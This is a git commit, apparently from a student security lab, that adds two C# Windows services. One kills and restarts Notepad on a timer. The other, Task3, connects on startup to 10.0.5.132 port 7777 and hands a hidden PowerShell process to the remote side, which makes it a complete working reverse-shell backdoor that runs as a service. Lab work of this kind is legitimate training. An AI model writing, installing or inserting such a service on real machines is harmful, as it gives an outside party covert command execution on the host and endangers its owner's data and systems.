10da48d5e6c43f795bbd4ec2bb0413cf4c708749
hoangnhan2405 <62413727+hoangnhan2405@users.noreply.github.com>
2021-04-04 09:09:22 +0700

    - update.

---
+++ Lab1/Task2/Task2/Service1.cs
@@ -0,0 +1,104 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Diagnostics;
+using System.IO;
+using System.Linq;
+using System.ServiceProcess;
+using System.Text;
+using System.Threading.Tasks;
+using System.Timers;
+
+namespace Task2
+{
+    public partial class Service1 : ServiceBase
+    {
+        //Tiến trình được xử dụng ở đây là notepad
+        static public string ProcessName = "notepad";
+        Timer timer = new Timer();
+        public Service1()
+        {
+            InitializeComponent();
+        }
+
+        protected override void OnStart(string[] args)
+        {
+            WriteToFile("Service is started at " + DateTime.Now);
+            WriteToFile(GetProcessStatus(ProcessName));
+            //Xử lý việc bật/tắt tiến trình theo chu kì 5 giây
+            timer.Elapsed += new ElapsedEventHandler(OnElapsedTime);
+            timer.Interval = 5000; //number in milisecinds
+            timer.Enabled = true;
+        }
+
+        protected override void OnStop()
+        {
+            WriteToFile("Service is stopped at " + DateTime.Now);
+        }
+        //Hàm kiểm tra tiến trình đang được mở hay tắt
+        public string GetProcessStatus(string pname)
+        {
+            Process[] name = Process.GetProcessesByName(pname);
+            if (name.Length == 0)
+                return "Process is not running";
+            else
+                return "Process is running";
+        }
+        //Hàm mở tiến trình
+        public void startProcess(string pname)
+        {
+            Process.Start(pname);
+        }
+        //Hàm ngưng tiến trình
+        public void stopProcess(string pname)
+        {
+            Process[] name = Process.GetProcessesByName(pname);
+            foreach (Process process in name)
+            {
+                process.Kill();
+            }
+        }
+        //Hàm xử lý vòng lặp khi service onStart 
+        private void OnElapsedTime(object source, ElapsedEventArgs e)
+        {
+            WriteToFile(GetProcessStatus(ProcessName));
+            if (GetProcessStatus(ProcessName) == "Process is not running")
+            {
+                WriteToFile("Stopped At" + DateTime.Now);
+                startProcess(ProcessName);
+            }
+            else
+            {
+                WriteToFile("Started At" + DateTime.Now);
+                stopProcess(ProcessName);
+            }
+        }
+        public void WriteToFile(string Message)
+        {
+            string path = AppDomain.CurrentDomain.BaseDirectory + "\\Logs";
+            if (!Directory.Exists(path))
+            {
+                Directory.CreateDirectory(path);
+            }
+            string filepath = AppDomain.CurrentDomain.BaseDirectory +
+           "\\Logs\\ServiceLog_" + DateTime.Now.Date.ToShortDateString().Replace('/', '_') +
+           ".txt";
+            if (!File.Exists(filepath))
+            {
+                // Create a file to write to.
+                using (StreamWriter sw = File.CreateText(filepath))
+                {
+                    sw.WriteLine(Message);
+                }
+            }
+            else
+            {
+                using (StreamWriter sw = File.AppendText(filepath))
+                {
+                    sw.WriteLine(Message);
+                }
+            }
+        }
+    }
+}
---
+++ Lab1/Task3/Task3/Service1.cs
@@ -0,0 +1,138 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Diagnostics;
+using System.IO;
+using System.Linq;
+using System.Net;
+using System.Net.Sockets;
+using System.ServiceProcess;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace Task3
+{
+    public partial class Service1 : ServiceBase
+    {
+        //Khởi tạo StreamWriter
+        static StreamWriter writer;
+        public Service1()
+        {
+            InitializeComponent();
+        }
+        //Khi service được khởi động
+        protected override void OnStart(string[] args)
+        {
+            WriteToFile("Service started at " + DateTime.Now);
+            if (CheckForInternetConnection())
+            {
+                WriteToFile("Connected");
+                ReverseShellService();
+            }
+            else
+                WriteToFile("Not connected");
+            
+        }
+        //Khi service ngưng 
+        protected override void OnStop()
+        {
+            WriteToFile("Service stopped at " + DateTime.Now);
+        }
+        //Hàm kiểm tra kết nối internet
+        public static bool CheckForInternetConnection()
+        {
+            try
+            {
+                using (var client = new WebClient())
+                using (client.OpenRead("http://google.com/generate_204"))
+                    return true;
+            }
+            catch
+            {
+                return false;
+            }
+        }
+        //Hàm mở kết nối ReverseShell
+        public void ReverseShellService()
+        {
+            //Kết nối tới máy có địa chỉ IP 10.0.5.132 với port 7777
+            using (TcpClient client = new TcpClient("10.0.5.132", 7777))
+            {
+                using (Stream stream = client.GetStream())
+                {
+                    using (StreamReader reader = new StreamReader(stream))
+                    {
+                        writer = new StreamWriter(stream);
+                        StringBuilder strInput = new StringBuilder();
+                        //Tạo tiến trình mới
+                        Process p = new Process();
+                        //Mở file powershell để reverse shell
+                        p.StartInfo.FileName = "powershell.exe";
+                        //Điều chỉnh các thông số ban đầu của tiến trình
+                        p.StartInfo.CreateNoWindow = true;
+                        p.StartInfo.UseShellExecute = false;
+                        p.StartInfo.RedirectStandardOutput = true;
+                        p.StartInfo.RedirectStandardInput = true;
+                        p.StartInfo.RedirectStandardError = true;
+                        //Xử lý dữ liệu nhập xuất với hàm CmdOutputDataHandler
+                        p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
+                        //Bắt đầu tiến trình
+                        p.Start();
+                        p.BeginOutputReadLine();
+                        //Xử lý dữ liệu được nhập 
+                        while (true)
+                        {
+                            strInput.Append(reader.ReadLine());
+                            p.StandardInput.WriteLine(strInput);
+                            strInput.Remove(0, strInput.Length);
+                        }                              
+                    }
+                }
+            }
+        }
+        //Hàm để xử lý dữ liệu nhập vào, xử lý lỗi xảy ra
+        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
+        {
+            StringBuilder strOutput = new StringBuilder();
+
+            if (!string.IsNullOrEmpty(outLine.Data))
+            {
+                try
+                {
+                    strOutput.Append(outLine.Data);
+                    writer.WriteLine(strOutput);
+                    writer.Flush();
+                }
+                catch (Exception err) { }
+            }
+        }
+        //Hàm viết vào file Logs
+        public void WriteToFile(string Message)
+        {
+            string path = AppDomain.CurrentDomain.BaseDirectory + "\\Logs";
+            if (!Directory.Exists(path))
+            {
+                Directory.CreateDirectory(path);
+            }
+            string filepath = AppDomain.CurrentDomain.BaseDirectory +
+           "\\Logs\\ServiceLog_" + DateTime.Now.Date.ToShortDateString().Replace('/', '_') +
+           ".txt";
+            if (!File.Exists(filepath))
+            {
+                // Create a file to write to.
+                using (StreamWriter sw = File.CreateText(filepath))
+                {
+                    sw.WriteLine(Message);
+                }
+            }
+            else
+            {
+                using (StreamWriter sw = File.AppendText(filepath))
+                {
+                    sw.WriteLine(Message);
+                }
+            }
+        }
+    }
+}
